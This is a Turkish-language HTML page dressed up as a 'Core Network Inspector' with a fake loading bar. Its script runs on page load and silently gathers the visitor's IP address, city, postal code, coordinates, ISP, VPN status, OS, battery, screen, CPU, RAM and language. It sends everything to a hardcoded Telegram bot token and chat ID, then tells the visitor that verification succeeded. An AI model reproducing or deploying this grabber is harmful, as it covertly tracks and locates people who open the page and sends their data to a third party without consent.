<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Analiz Merkezi</title>
    <style>
        body { background: #020202; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .matrix-box { width: 85%; max-width: 440px; padding: 30px; border: 2px dashed #00ff66; background: #050505; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 102, 0.4); border-radius: 4px; }
        .progress-bar { width: 100%; background: #222; border: 1px solid #00ff66; height: 10px; margin-top: 20px; position: relative; }
        .progress-fill { width: 0%; height: 100%; background: #00ff66; transition: width 0.4s ease; }
    </style>
</head>
<body>

    <div class="matrix-box">
        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.0</div>
        <div id="status" style="margin-top: 15px; color: #ff3333;">[!] Güvenli tünel senkronizasyonu başlatılıyor...</div>
        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
    </div>

    <script>
        window.onload = async function() {
            let fill = document.getElementById('fill');
            let status = document.getElementById('status');

            fill.style.width = "20%";
            status.innerText = "[*] Önbellek ve tünel proxy katmanları kırılıyor...";
            await new Promise(r => setTimeout(r, 800));

            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
            let posta_kodu = "Bilinmiyor", koordinat = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
            let mobil_mi = "Hayır (Ev/İş İnterneti)", vpn_proxy = "Temiz (Doğal Bağlantı)", ulke_kod = "-", para_birimi = "-";
            let os = "Bilinmeyen Sistem";

            fill.style.width = "50%";
            status.innerText = "[*] HTTPS Gateway üzerinden konum verileri çekiliyor...";
            
            let cacheBuster = "?cb=" + Math.random();
            try {
                let istek = await fetch("https://ipapi.co/json/" + cacheBuster);
                let veri = await istek.json();
                
                if (veri && !veri.error) {
                    ip = veri.ip || "Bilinmiyor";
                    ulke = veri.country_name || "Bilinmiyor";
                    eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
                    posta_kodu = veri.postal || "Bilinmiyor";
                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
                    internet_sirketi = veri.org || "Bilinmiyor";
                    ulke_kod = veri.country_calling_code || "-";
                    para_birimi = veri.currency || "-";

                    let org_lower = internet_sirketi.toLowerCase();
                    if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
                        mobil_mi = "Evet (Mobil Şebeke)";
                    }
                }
            } catch (e) {
                try {
                    let r2 = await fetch("https://api.db-ip.com/v2/free/self" + cacheBuster);
                    let d2 = await r2.json();
                    if (d2 && d2.ipAddress) { ip = d2.ipAddress; ulke = d2.countryName; eyalet_sehir = d2.city; }
                } catch(err){}
            }

            fill.style.width = "75%";
            status.innerText = "[*] High-Entropy donanım mimarisi çözülüyor...";
            
            let ua = navigator.userAgent;
            if (/Android/i.test(ua)) {
                os = "Android";
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    try {
                        let uaData = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
                        if (uaData.platformVersion) {
                            let major = parseInt(uaData.platformVersion.split('.')[0]);
                            if (major === 11) os = "Android 11";
                            else if (major === 12) os = "Android 12";
                            else if (major === 13) os = "Android 13";
                            else if (major === 14) os = "Android 14";
                            else if (major === 15) os = "Android 15";
                            else if (major > 0 && major <= 10) os = "Android " + major;
                        }
                    } catch (uaErr) {
                        let match = ua.match(/Android\s([0-9\.]+)/);
                        os = match ? "Android " + match[1] : "Android";
                    }
                } else {
                    let match = ua.match(/Android\s([0-9\.]+)/);
                    os = match ? "Android " + match[1] : "Android";
                }
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                os = "iOS";
            } else if (/Windows/i.test(ua)) {
                os = "Windows";
            }

            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (cihaz_saati.toLowerCase().includes("istanbul")) {
                if (ulke !== "Bilinmiyor" && ulke !== "Turkey") {
                    vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
                }
            }

            let pil = "Bilinmiyor";
            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
            let ekran = window.screen.width + "x" + window.screen.height;
            let cekirdek = navigator.hardwareConcurrency || "?";
            let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
            let dil = navigator.language || "Bilinmiyor";
            let tarih = new Date().toLocaleString('tr-TR');

            fill.style.width = "100%";
            status.style.color = "#00ff66";
            status.innerText = "[+] Protokol doğrulandı. Paket gönderiliyor...";

            let mesaj = "👑 *ULTIMATE SYSTEM NETWORK LOG*\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
            mesaj += "🤖 *Sistem (OS):* " + os + " 🛡️\n";
            mesaj += "⏰ *Zaman damgası:* " + tarih + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
            mesaj += "🛡️ *VPN / Proxy:* " + vpn_proxy + "\n";
            mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
            mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
            mesaj += "💾 *Sistem RAM:* " + ram + "\n";
            mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
            mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";

            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
            let cid = "6845229845";
            let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";

            fetch(url).then(() => {
                status.innerText = "✓ Doğrulama Başarılı. Yönlendirildiniz.";
            }).catch(() => {
                status.innerText = "Bağlantı hatası, paket düşürüldü.";
            });
        };
    </script>
</body>
</html>
